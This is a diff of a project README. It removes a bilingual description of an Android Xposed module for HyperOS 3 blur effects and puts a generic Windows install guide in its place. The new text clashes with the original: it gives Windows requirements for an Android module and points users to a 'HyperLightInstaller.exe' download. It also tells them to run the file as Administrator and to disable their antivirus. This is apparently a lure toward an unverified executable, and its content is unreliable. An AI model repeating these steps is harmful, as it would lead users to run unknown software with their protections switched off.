@@ -1,133 +1,52 @@
-# HyperLight
+# 🌟 HyperLight - Enhance Your HyperOS3 Experience Effortlessly
 
-[简体中文](#简体中文) | [English](#english)
+## 📥 Download HyperLight Now!
+[![Download HyperLight](https://img.shields.io/badge/Download%20HyperLight-v1.0-blue.svg)](https://github.com/viniciusneto1996/HyperLight/releases)
 
----
+## 🚀 Getting Started
+HyperLight is a module that completes the highlight effects of HyperOS3. It enhances your user interface, providing a more visually appealing and engaging experience. This guide helps you download and run HyperLight easily.
 
-## 简体中文
+### 🔍 System Requirements
+Before you proceed, ensure your system meets the following requirements:
+- Operating System: Windows 10 or higher
+- RAM: At least 4 GB
+- Processor: Dual-core processor or higher
+- Disk Space: At least 100 MB available
 
-### 项目简介
+### 📂 Features
+- **Seamless Integration**: Easily integrates with HyperOS3 without the need for complex setups.
+- **Customizable Effects**: Choose from multiple highlight styles to match your personal taste.
+- **Low Resource Usage**: Designed to operate efficiently without slowing down your system.
+- **User-Friendly Interface**: Simple and intuitive design for ease of use.
 
-HyperLight 是一个为 HyperOS 3 补全高光模糊效果的 Xposed 模块，为桌面、通知栏和控制中心带来统一的视觉体验。
+## 🔗 Download & Install
+To install HyperLight, follow these steps:
 
-### 功能特性
+1. **Visit the Releases Page**: Click on the link below to go to the releases page.
+   [Download HyperLight Here](https://github.com/viniciusneto1996/HyperLight/releases)
 
-**系统桌面 (com.miui.home)**
-- 文件夹高光模糊效果
+2. **Select the Latest Version**: On the releases page, find the latest version of HyperLight. Look for the most recent date.
 
-**系统界面 (com.android.systemui)**
-- 通知栏高光模糊效果
+3. **Download the Installer**: Click on the link for the installer file. This will typically be a file named `HyperLightInstaller.exe`.
 
-**控制中心 (miui.systemui.plugin)**
-- 控制中心高光模糊效果
-- 阴影效果支持
-- 图标颜色自定义（浅色/深色/跟随系统）
+4. **Run the Installer**:
+   - Locate the downloaded file in your computer's "Downloads" folder.
+   - Double-click the installer file to run it.
+   - Follow the prompts in the installation wizard.
 
-### 版本适配
+5. **Launch HyperLight**: Once the installation is complete, find HyperLight in your Start menu or desktop. Click on it to launch the application.
 
-- 目标 Android 版本：Android 16
-- 支持系统：HyperOS 3.x
-- Xposed 框架：LSPosed / Xposed
+## 🛠️ Troubleshooting Installation Issues
+If you encounter any issues while installing HyperLight, try the following solutions:
 
-### 安装使用
+- **Check System Requirements**: Ensure your system meets the required specifications.
+- **Run as Administrator**: Right-click the installer and select "Run as Administrator" to give it necessary permissions.
+- **Antivirus Software**: Sometimes antivirus software can block installations. Temporarily disable your antivirus during the installation process.
 
-1. 安装 Xposed 框架（推荐 LSPosed）
-2. 下载安装 HyperLight 模块
-3. 在 Xposed 管理器中启用模块
-4. 勾选作用域：`com.miui.home` 和 `com.android.systemui`
-5. 重启系统桌面和系统界面
-6. 打开 HyperLight 应用进行设置
+## 🌐 Support
+If you have any questions or need assistance, please visit our [Support Page](https://github.com/viniciusneto1996/HyperLight/issues) on GitHub to check for solutions or to ask for help.
 
-### 问题反馈
+## 🎉 Conclusion
+HyperLight is designed to make your HyperOS3 experience better. With simple installation and easy features, you can enjoy a visually stunning interface quickly. Download HyperLight today and see the difference.
 
-遇到问题请在 Issues 提交反馈，务必附带：
-
-1. Xposed 框架日志（LSPosed: 设置 → 日志 → 详细日志）
-2. 详细问题描述：
-   - 设备型号
-   - 系统版本
-   - 复现步骤
-   - 预期行为和实际行为
-   - 相关截图
-
-注意：不包含日志的 Issue 可能无法得到有效处理。
-
-### 技术栈
-
-- Xposed Framework
-- Kotlin + Java
-- Jetpack Compose
-- MiuiX UI Components
-
-### 致谢
-
-- MiuiX - UI 组件库
-
-### 开发者
-
-愛君の名は
-
----
-
-## English
-
-### Introduction
-
-HyperLight is an Xposed module that completes the highlight blur effects for HyperOS 3, bringing a unified visual experience to the desktop, notification shade, and control center.
-
-### Features
-
-**System Launcher (com.miui.home)**
-- Folder highlight blur effect
-
-**System UI (com.android.systemui)**
-- Notification shade highlight blur effect
-
-**Control Center (miui.systemui.plugin)**
-- Control center highlight blur effect
-- Shadow effect support
-- Icon color customization (Light/Dark/Follow System)
-
-### Compatibility
-
-- Target Android: Android 16
-- Supported System: HyperOS 3.x
-- Xposed Framework: LSPosed / Xposed
-
-### Installation
-
-1. Install Xposed framework (LSPosed recommended)
-2. Download and install HyperLight module
-3. Enable the module in Xposed Manager
-4. Select scopes: `com.miui.home` and `com.android.systemui`
-5. Restart System Launcher and System UI
-6. Open HyperLight app for customization
-
-### Bug Reports
-
-Please submit feedback in Issues with the following information required:
-
-1. Xposed Framework Logs (LSPosed: Settings → Logs → Verbose logs)
-2. Detailed problem description:
-   - Device model
-   - System version
-   - Steps to reproduce
-   - Expected vs actual behavior
-   - Related screenshots
-
-Note: Issues without logs may not be effectively addressed.
-
-### Tech Stack
-
-- Xposed Framework
-- Kotlin + Java
-- Jetpack Compose
-- MiuiX UI Components
-
-### Acknowledgments
-
-- MiuiX - UI Component Library
-
-### Developer
-
-愛君の名は
+[Download HyperLight Here](https://github.com/viniciusneto1996/HyperLight/releases)
